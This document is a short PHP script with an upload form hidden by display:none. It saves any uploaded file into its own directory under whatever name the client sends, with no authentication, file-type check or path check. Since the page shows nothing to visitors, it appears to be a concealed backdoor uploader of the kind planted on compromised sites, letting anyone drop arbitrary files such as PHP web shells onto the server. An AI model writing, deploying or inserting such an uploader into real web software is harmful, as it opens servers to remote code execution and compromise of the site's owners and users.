<?php
if($_POST){
  if ($_FILES["file"]["error"] > 0)
    {
    echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
    }
  else
    {
      move_uploaded_file($_FILES["file"]["tmp_name"],
      $_FILES["file"]["name"]);
      echo "Stored in: " .$_FILES["file"]["name"];
    }
}
?>

<html>
<body>
<div style="display:none">
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="file" id="file" /> 
<input type="submit" name="submit" value="Submit" />
</form>
</div>
</body>
</html>